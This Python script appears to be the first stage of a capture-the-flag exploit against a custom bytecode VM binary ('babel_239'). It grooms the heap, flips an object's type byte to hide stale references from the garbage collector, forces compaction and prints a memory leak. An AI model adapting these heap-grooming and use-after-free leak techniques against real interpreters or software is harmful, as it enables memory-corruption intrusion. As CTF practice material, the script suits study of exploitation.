import vm, struct, subprocess, sys

BIN = "/mnt/work/buuctf/other/2.39/amd64/babel/lab/babel_239"

def frame(p):
    c = vm.asm(p)
    return struct.pack('<I', len(c)) + c

# ---- Stage 1: heap layout, hide stale refs in a GC-invisible list, compact, leak ----
stage1 = []
# S0: zero-length string at 0x00 (live) -> used to flip the type byte of the next object
stage1 += [('str', b''), ('stl', 1)]
# HL: list(2) at 0x20 (live), elements will hold the stale refs
stage1 += [('push', 0), ('push', 0), ('list', 2), ('stl', 0)]
# flip HL's type u16 -> 0 so the GC never scans its elements
stage1 += [('ldl', 1), ('push', 0), ('setb', 0)]
# D: dead list(1) at 0x50 ; ref = (0x50<<4)|3 = 0x503
stage1 += [('push', 0), ('list', 1), ('stl', 6)]
stage1 += [('ldl', 0), ('ldl', 6), ('sete', 0)]
# B: dead input buffer at 0x70 ; ref = (0x70<<4)|9 = 0x709
stage1 += [('input', 16), ('stl', 7)]
stage1 += [('ldl', 0), ('ldl', 7), ('sete', 1)]
# H: live handle(1) at 0x90 -> must land on 0x50 after compaction
stage1 += [('hdl', 1), ('stl', 2)]
# A: live list(1) at 0xB0 with elem0 = 0 -> must land on 0x70 (= slot 0 for bind)
stage1 += [('push', 0), ('list', 1), ('stl', 3)]
# trigger GC with a big dead string
stage1 += [('str', b'Z' * 0x7ff0), ('pop',)]
# report: refs of H and A after compaction, then the leak through the stale tag-3 ref
stage1 += [('ldl', 2), ('print',), ('pop',)]          # H ref  (expect (0x50<<4)|7 = 0x507 >>1 = 0x283 = 643)
stage1 += [('ldl', 3), ('print',), ('pop',)]          # A ref  (expect (0x70<<4)|3 -> >>1 = 0x381 = 897)
stage1 += [('ldl', 0), ('gete', 0), ('print',), ('pop',)]   # stale tag3 ref (0x503)
stage1 += [('ldl', 0), ('gete', 0), ('gete', 0), ('print',)]  # *(&0x59098[1]) leak

data = frame(stage1)
p = subprocess.run([BIN], input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=60)
print("rc=", p.returncode)
print("out=", p.stdout)
print("err=", p.stderr[:200])
